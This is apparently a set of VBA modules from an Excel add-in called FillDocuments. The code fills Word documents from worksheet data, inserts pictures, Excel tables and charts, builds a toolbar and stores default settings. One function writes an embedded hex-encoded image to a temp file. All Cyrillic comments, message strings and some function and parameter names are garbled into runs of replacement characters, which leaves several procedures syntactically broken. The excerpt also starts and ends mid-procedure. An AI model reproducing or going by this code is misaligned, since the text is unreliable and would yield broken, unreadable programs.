        Case key$ Like "*" & COLUMN_MARK_IMAGE$ & "*"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

            Dim sizeW&, sizeH&, IShape As Object
            If txt Like "*|*" Then
                ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| | |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, IMG_3515.JPG|1200|1500
                ' |fffd||fffd||fffd| 1200 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| 1500 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
                sizeW& = Val(Split(txt, "|")(1))
                sizeH& = Val(Split(txt, "|")(2))
                txt = Split(txt, "|")(0)
            End If

            If txt Like "*?*.*?*" Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                If txt Like "[A-Z]:\?*.?*" Then
                    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
                    filename$ = Trim(txt)
                Else
                    If Not FolderExists(IMAGES_FOLDER$) Then
                        pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd|: " & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                        Exit Sub
                    End If
                    filename$ = IMAGES_FOLDER$ & Trim(txt)
                End If

                If FileExists(filename$) Then
                    pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Word: " & Dir(filename$, vbNormal)

                    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Word
                    For Each myStoryRange In doc.StoryRanges
                        DoEvents
                        With myStoryRange
                            .Select
                            With doc.Parent.Selection.Find
                                .Text = key$
                                While .Execute
                                    Set IShape = Nothing: Set IShape = doc.Parent.Selection.InlineShapes.AddPicture(filename$, False, True)
                                    If sizeW& + sizeH& > 0 Then
                                        If Not IShape Is Nothing Then ResizeInlineShape IShape, sizeW&, sizeH&
                                    End If
                                Wend
                            End With
                        End With

                        While Not (myStoryRange.NextStoryRange Is Nothing)
                            Set myStoryRange = myStoryRange.NextStoryRange
                            With myStoryRange
                                .Select
                                With doc.Parent.Selection.Find
                                    .Text = key$
                                    While .Execute
                                        Set IShape = Nothing: Set IShape = doc.Parent.Selection.InlineShapes.AddPicture(filename$, False, True)
                                        If sizeW& + sizeH& > 0 Then
                                            If Not IShape Is Nothing Then ResizeInlineShape IShape, sizeW&, sizeH&
                                        End If
                                    Wend
                                End With
                            End With
                        Wend
                    Next myStoryRange

                Else
                    pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd|: " & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & txt & "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                End If
            Else        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            End If
    End Select
End Sub

Sub ResizeInlineShape(ByRef IShape As Object, ByVal sizeW&, ByVal sizeH&)
    On Error Resume Next
    If sizeW& = 0 And sizeH& = 0 Then Exit Sub
    If sizeW& < 0 Or sizeH& < 0 Then Exit Sub
    With IShape
        .LockAspectRatio = True
        Select Case True
            Case sizeW& > 0 And sizeH& > 0
                .Width = sizeW&
                If .Height > sizeH& Then .Height = sizeH&
            Case sizeH& > 0
                .Height = sizeH&
            Case sizeW& > 0
                .Width = sizeW&
        End Select
    End With
    Err.Clear
End Sub

Function InsertTableStylesArray() As Variant
    ReDim arr(0 To 3, 0 To 1)
    arr(0, 0) = "Excel": arr(0, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel"
    arr(1, 0) = "Word": arr(1, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Word"
    arr(2, 0) = "PlainText": arr(2, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
    arr(3, 0) = "Picture": arr(3, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    InsertTableStylesArray = arr
End Function

Function CopyExcelTable(ByVal Link$, Optional ByRef msg$, Optional ByRef InsertMode$) As Boolean
    On Error Resume Next
    Dim ra As Range, sh As Worksheet, WB As Workbook, filename$, shortFilename$, SheetName$, RangeAddress$
    If Link$ Like LINK_HEADER_TABLE$ & "*/*/*" Then
        Link$ = Split(Link$, LINK_HEADER_TABLE$)(1)
        filename$ = Split(Link$, "/")(0)
        If filename$ = "" Then
            filename$ = ActiveWorkbook.FullName
        Else
            If (Not filename$ Like "[A-Z]:\*") And (Not filename$ Like "\\*") Then
                filename$ = TABLES_FOLDER$ & filename$
            End If
        End If
        shortFilename$ = Dir(filename$, vbNormal)
        If Len(shortFilename$) Then
            Err.Clear: Set WB = Workbooks(CStr(shortFilename$))
            If WB Is Nothing Then
                Application.DisplayAlerts = False
                ExcelTablesToBeClosed.Add shortFilename$, shortFilename$
                Set WB = Workbooks.Open(filename$, , True)
                Application.DisplayAlerts = True
            End If
            'If Err Then Debug.Print Err.Number, Err.Description, filename$
            If WB Is Nothing Then msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|" & shortFilename$ & "|fffd|": Exit Function

            SheetName$ = Split(Link$, "/")(1)
            Set sh = WB.Worksheets(CStr(SheetName$))
            If sh Is Nothing Then msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & shortFilename$ & "|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|" & SheetName$ & "|fffd|": Exit Function

            RangeAddress$ = Split(Link$, "/")(2)
            If RangeAddress$ = "UsedRange" Then
                Set ra = sh.UsedRange
            Else
                Set ra = sh.Range(RangeAddress$)
            End If
            If ra Is Nothing Then msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: |fffd|" & RangeAddress$ & "|fffd|": Exit Function

            InsertMode$ = Split(Link$, "/")(3)

            ra.Copy
            CopyExcelTable = True
        Else
            msg$ = "|fffd||fffd||fffd||fffd| |fffd|" & filename$ & "|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
        End If
    End If
End Function

Function CopyExcelChart(ByVal Link$, Optional ByRef msg$, Optional ByRef InsertMode$) As Boolean
    On Error Resume Next
    Dim ch As ChartObject, sh As Worksheet, WB As Workbook, filename$, shortFilename$, SheetName$, ChartIndex&
    If Link$ Like LINK_HEADER_CHART$ & "*/*/*" Then
        Link$ = Split(Link$, LINK_HEADER_CHART$)(1)
        filename$ = Split(Link$, "/")(0)
        If filename$ = "" Then
            filename$ = ActiveWorkbook.FullName
        Else
            If (Not filename$ Like "[A-Z]:\*") And (Not filename$ Like "\\*") Then
                filename$ = TABLES_FOLDER$ & filename$
            End If
        End If
        shortFilename$ = Dir(filename$, vbNormal)
        If Len(shortFilename$) Then
            Err.Clear: Set WB = Workbooks(CStr(shortFilename$))
            If WB Is Nothing Then
                Application.DisplayAlerts = False
                ExcelTablesToBeClosed.Add shortFilename$, shortFilename$
                Set WB = Workbooks.Open(filename$, , True)
                Application.DisplayAlerts = True
            End If
            'If Err Then Debug.Print Err.Number, Err.Description, filename$
            If WB Is Nothing Then msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|" & shortFilename$ & "|fffd|": Exit Function

            SheetName$ = Split(Link$, "/")(1)
            Set sh = WB.Worksheets(CStr(SheetName$))
            If sh Is Nothing Then msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & shortFilename$ & "|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|" & SheetName$ & "|fffd|": Exit Function

            ChartIndex& = Val(Split(Link$, "/")(2))
            Set ch = sh.ChartObjects(ChartIndex&)
            If ch Is Nothing Then msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd|" & Split(Link$, "/")(2) & "|fffd|": Exit Function

            InsertMode$ = Split(Link$, "/")(3)

            ch.Copy
            CopyExcelChart = True
        Else
            msg$ = "|fffd||fffd||fffd||fffd| |fffd|" & filename$ & "|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
        End If
    End If
End Function

Sub AddImagesFilenamesValidationList_IntoSelectedRange()
    On Error Resume Next
    Dim coll As Collection, item, filename$, list$, ra As Range
    Set coll = FWF.FilenamesCollection(IMAGES_FOLDER$, , 1)

    For Each item In coll
        filename$ = Dir(item, vbNormal)
        If Len(list$) + Len(filename$) < 250 Then list$ = list$ & "," & filename$
    Next

    Set ra = Intersect(Selection, ActiveSheet.UsedRange)
    With ra.Validation
        .Delete
        .Add xlValidateList, , xlBetween, Mid(list$, 2)
    End With
End Sub
Attribute VB_Name = "mod_Main"
'---------------------------------------------------------------------------------------
' Module        : mod_Main                    Version:
' Author        : Igor Vakhnenko                   Date: 22.09.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Private Module        ': Option Explicit
Public Const PROJECT_NAME$ = "FillDocuments", PROJECT_YEAR& = 2012

Private Sub CreateCommandBar(): CreateProgramCommandBar 0: End Sub

Sub CreateProgramCommandBar(Optional ByVal RefreshOnly As Boolean = True)
    On Error Resume Next
    SaveDefaultSettings

    Dim AddinMenu As CommandBar, coll As Collection, i&, MainMacroButton As Object, NeedToSelectParser As Boolean
    Application.ScreenUpdating = False
    If Not RefreshOnly Then Run DeleteOldCommandBar
    Set AddinMenu = GetCommandBar(PROJECT_NAME, True Or RefreshOnly)

    ' menu begin
    Set MainMacroButton = Add_Control(AddinMenu, ct_BUTTON, 593, "CreateAllDocuments", tt("MENU_MainButton"), msoButtonIconAndCaption, True)

    If SETT.GetBoolean("CheckBox_ShowAdditionalMenu") Then
        Set ExtendedMenu = Add_Control(AddinMenu, ct_POPUP, 0, "", "  " & tt("MENU_Extra"))
        Add_Control ExtendedMenu, ct_BUTTON, 385, "UpdateUDFs", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True        ' 202
        Add_Control ExtendedMenu, ct_BUTTON, 142, "CtrlShiftT", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|... (Ctrl + Shift + T)", msoButtonIconAndCaption, True
        Add_Control ExtendedMenu, ct_BUTTON, 218, "CtrlShiftI", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|... (Ctrl + Shift + I)", msoButtonIconAndCaption, False        ' 508
        Add_Control ExtendedMenu, ct_BUTTON, 0, "AddImagesFilenamesValidationList_IntoSelectedRange", _
                    "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, False        ' 508
        Add_Control ExtendedMenu, ct_BUTTON, 0, "AddAbsentFieldCodes", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...", msoButtonIconAndCaption, True
        Add_Control ExtendedMenu, ct_BUTTON, 0, "ShowUsageExample", tt("ShowUsageExample"), msoButtonIconAndCaption, True

    End If

    '    If Not SETT.GetBoolean("HideSettingsButton") Then Add_Control AddinMenu, ct_BUTTON, 548, "ShowSettingsPage", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True
    '    If Not SETT.GetBoolean("HideAboutButton") Then Add_Control AddinMenu, ct_BUTTON, 487, "ShowMainForm", "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...", msoButtonIconAndCaption, True

    AddSettingsSwitcher AddinMenu, ct_DROPDOWN, , "CreateAllDocuments", MainMacroButton
    ' menu end
    Add3Buttons AddinMenu

    If Not RefreshOnly Then
        RunWithDelay "ActivateAddinsTab"
        AddUpdateButton AddinMenu
        RunWithDelay "ActivateAddinsTab"
    End If

    If Developer Then
        Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0
        'Add_Control AddinMenu, ct_BUTTON, , "ShowFirstRunForm", "Show FirstRun Form", msoButtonIconAndCaption, True
        Add_Control AddinMenu, ct_BUTTON, , "ToggleIsAddin", "Show/Hide TR Sheet", msoButtonIconAndCaption, True
    End If

    Set ThisWorkbook.app = Application
    Application.ScreenUpdating = True
End Sub

Sub SaveDefaultSettings()
    On Error Resume Next
    With SETT
        .LoadAllSettings

        .AddDefaultValue "CheckBox_InsertIntoFields", False
        .AddDefaultValue "CheckBox_TemplatesForm_SortByName", True
        .AddDefaultValue "MultiPage_Mode", 0        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        .AddDefaultValue "CheckBox_ReplaceExistingFieldCodesOnly", True    'False

        .AddDefaultValue "TextBox_CombineXLS_filename", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|.xls", , True
        .AddDefaultValue "TextBox_SendInterval_Min", 0
        .AddDefaultValue "TextBox_SendInterval_Max", 0
        .AddDefaultValue "TextBox_HyperlinkText", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", , True

        .AddDefaultValue "ComboBox_FirstRow", 1
        .AddDefaultValue "ComboBox_BaseColumn", 2, True
        .AddDefaultValue "ComboBox_TemplatesFilter_Column", 5, True
        .AddDefaultValue "ComboBox_LineFeed", Chr(11), , True
        .AddDefaultValue "TextBox_OutputMask", "{%str%} - {%filename%}.{%ext%}", , True

        .AddDefaultValue "ComboBox_FirstColumn", 1, True
        .AddDefaultValue "ComboBox_BaseRow", 2
        .AddDefaultValue "CheckBox_UseAllColumns", True

        .AddDefaultValue "TextBox_AttachCreatedFilesMask", "*", , True
        .AddDefaultValue "TextBox_AttachStaticFilesMask", "*", , True

        .AddDefaultValue "CheckBox_ShowFolderWhenDone", True
        .AddDefaultValue "CheckBox_TemplatesFilter_Enabled", False
        .AddDefaultValue "ComboBox_SendMark_Column", 10, True
        .AddDefaultValue "ComboBox_SendTime_Column", 11, True
        .AddDefaultValue "ComboBox_Multirow_GroupColumn", 1, True
    End With
End Sub

Sub SettingSetChanged()
    RunWithDelay "CreateProgramCommandBar", 0.5
End Sub

Sub UpdateAddinToolbar()
    RunWithDelay "CreateProgramCommandBar", 0.6
End Sub

Sub ToggleIsAddin()
    On Error Resume Next
    ThisWorkbook.IsAddin = Not ThisWorkbook.IsAddin
End Sub

Function GetFile_MainPicture() As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next:
    Dim F_TXT$, buf$, tmp_file$, i&, res$, ff&: Const BufLen& = 5000

    F_TXT$ = F_TXT$ & "EDB6E7DB5BB96CA2BF6AD49352A71714CA95C14DADA713EF2168500A4A8641C11D8823A10740957A641AA4528A30A83C8EBC5119A5AE3FE8A5613FB13A9AAAF7F567C20EE755EE216FCC5D06EB88E34F53494F13554A14A8EEA42547A38414AB1D7AA8F5200D6886C98C020EA191E2777B6E4977FA6C0B1EB8EDBED52228A85C75A88DA5C758E63D8464641C2943D671D4829EA0056883C226F45D5B833EEFB5AE99AC57DFB70455355E8EC0655212F254783A84FA4389E1DD27AE7E9932B57E6CFDBFB3DF4CF52EAB79572519D5420725CBA83E7D0C803B8493C703A745918CEAE4F0CFB3436576BE152E514BD70CE51A856657425D94E60A867E2940C207E5CFC4EA36C5799D7A9F513909029D27A5079536CFE391AC11CC3CAEA34514996857CC564FA1C085D6F5C4776537C287B8D01EFBBEDDBB7CBB7AE57529050C48C7F473540F4CA4FA0A8F40918EEAD1CEE2DFD44DA8A741A95420546E59B2E4A6031163321D7E44929529011C8A50080859383D00FA68DF75F6F20EEC6DCDC1695470235522A990E1192D39DDB707D52B0950FCBA866BD7EDC53A2EDCDD1715424BD26DD151B72753D653C6257633652952940057379B0559513D720633AAA9EB32E52963603C2BA79626CE4CB27E22DFB865DCBE263712B0CADC8B1ADFB069DFDC"
    F_TXT$ = F_TXT$ & "94B352983F5CB6D27FEF4978551B937277426D46E5B8AA574C1B4E2B5528D1A5A1086DC92EE436F36CB684278200CE403EA03AE0EA8B776EE914C91C9EA0B956ABCF67CD764A5030CAD5D17C14E2B8B585F2F4A3A8C763AC7797856A7F888AD53EF1B96AEFDBD528713EEC9EDD2DFE42506CABD4B2A09E190A27033E950F97584956DBB5C513A55C6B1BAD253D2848012FB2FB38C64F382F98ACAB996FA444B5D1C87C8254A2E4B70DA1FCD44BD47A1DE9B9F7E1AFDB11A6B9FC3CFA9EA64D654CA5B5CF694DA94A3E6AD21C42393692067A2BEBAE8CECCEE635BB160C2AE18C69F514AD70EA54F5FBD0E63478BCD1FC14323E69524FC74ACA2DA966DA56052A9F46A84A71BA3151FB05216A506D414A121398C9E473ED082B249F4924EBCCDA0AAC7B0FC4655683104D6A877953CCF613350F026A11B01C29F33AFAD85249CF7F246AAAD76C976A9029E4A89480031660DB231F51C9C9CEA272B2B155ABEE2D201CE72E7ECF9E34303DC53DA86BC4BD9A2DFDDFB9E8EDE59837E52D35CA6908E41AACC0C1250803A9520214AC64AB2411AB9749FF00125B2351DE3A1505DA05523516E7A054533E04B96D95B441494B8DAC0EA12A041E80FBA07C73A710BE046C3BBFF9A9B7146AD427DDA63D2584BEF06D2952DA7127CB90D7AC10087123B8"
    F_TXT$ = F_TXT$ & "CE4A8FC74516952E814BABCA3582C496DD693210BAABE1D2975278A94942C9EA52A4754A46388F98D26697B45BB3B26E552834482EEE1FDFAA1514D618718A7330A5385425A1495ACF14A92968A4A41C92A38CF4D1150BC33EE55CB2FEDB73DE54FB590B6D2DAA25BF1CCB91C3912417DE012951CE094B67B0C76D0DD9F2F70183454F83B043FB86556378AD5B6555A7532D4F450E216BCA030CB4AF2D208E6B23A10127DDF89EF9D25769ABCEEFCEEFDA72EDB8A98F6ED96E2E649ACF985E52F932E30D454B984A54A5A5654BC27A0477C919725B5E11B6D6852D33AA3497AEFAA0214675CF2153D448EC7CB57B24FF008A0761F21A704488C408CDC78ACB71A3B69E2869A404A103E400E8068980A3FFD9"
    For i = 1 To Len(F_TXT$) / 2
        buf$ = buf$ & Chr(Val("&H" & Mid(F_TXT$, 2 * i - 1, 2)))
        If Len(buf$) > BufLen& Then res$ = res$ & buf$: buf$ = "": DoEvents
    Next: res$ = res$ & buf$
    tmp_file$ = Environ("tmp") & "\file_MainPicture_" & PROJECT_NAME$: Kill tmp_file$
    ff& = FreeFile: Open tmp_file$ For Binary Access Write As #ff
    Put #ff, , res$
    Close #ff
    If FileLen(tmp_file$) = Len(F_TXT$) / 2 Then GetFile_MainPicture = tmp_file$ Else Debug.Print FileLen(tmp_file$), Len(F_TXT$) / 2
End Function

Sub ShowUsageExample()        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    On Error Resume Next: Dim UF As Object: Set UF = UserForms.Add("F_UsageExample")
    If Not UF Is Nothing Then UF.Show
End Sub

Sub FirstRunActions()
    On Error Resume Next
    SETT.SetText "TEMPLATE_FOLDER", tt("CONST_TEMPLATE_FOLDER"), "Setup"
    SETT.SetText "OUTPUT_FOLDER", tt("CONST_OUTPUT_FOLDER"), "Setup"
    x = TEMPLATES_FOLDER$
    x = OUTPUT_FOLDER$
End Sub

Attribute VB_Name = "mod_SheetFunctions"
'---------------------------------------------------------------------------------------
' Module        : mod_SheetFunctions
' Author        : EducatedFool                     Date: 07.01.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/         Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text

' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Sub UpdateUDFs()
    On Error Resume Next
    If ActiveWorkbook Is Nothing Then Exit Sub

    calc = Application.Calculation
    Application.Calculation = xlCalculationManual
    Application.ScreenUpdating = False
    Dim sh As Worksheet, ra As Range, cell As Range, ErrorsCount&, coll As New Collection
    For Each sh In ActiveWorkbook.Worksheets
        Set ra = Nothing: Set ra = FindAll(sh.UsedRange, "\FillDocuments", xlFormulas, xlPart)        '& ThisWorkbook.Name & "'!", xlFormulas, xlPart)
        If Not ra Is Nothing Then
            Set coll = New Collection
            For Each cell In ra.Cells
                ErrorsCount& = ErrorsCount& + 1
                oldPath$ = GetOldAddinPathForReplace(cell.Formula)
                If Len(oldPath$) Then coll.Add oldPath$, oldPath$
            Next cell
            For Each item In coll
                sh.UsedRange.Replace item, "'" & ThisWorkbook.Name & "'", xlPart
            Next
        End If
    Next sh
    Application.Calculation = calc
    If ErrorsCount& Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & ErrorsCount&, vbInformation
    Else
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| FillDocuments", vbInformation
    End If
End Sub

Private Function GetOldAddinPathForReplace(ByVal txt As String) As String
    On Error Resume Next
    stext$ = "\FillDocuments"        '"\" & ThisWorkbook.Name & "'!"
    pos& = InStr(1, txt, stext, vbTextCompare)
    If pos& = 0 Then Exit Function

    pos1& = InStrRev(txt, "'", pos, vbTextCompare)
    If pos1& = 0 Then Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
    pos2& = InStr(pos&, txt, "'", vbTextCompare)
    If pos2& = 0 Then Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function

    GetOldAddinPathForReplace = Mid(txt, pos1, pos2 - pos1 + 1)
End Function

' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd|

Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    FIO$ = Application.Trim(Replace(Replace(Replace(|fffd||fffd||fffd|, " - ", "-"), " -", "-"), "- ", "-"))
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd| = Split(FIO$)(0)
End Function
Function |fffd||fffd||fffd|_|fffd||fffd|_|fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|)
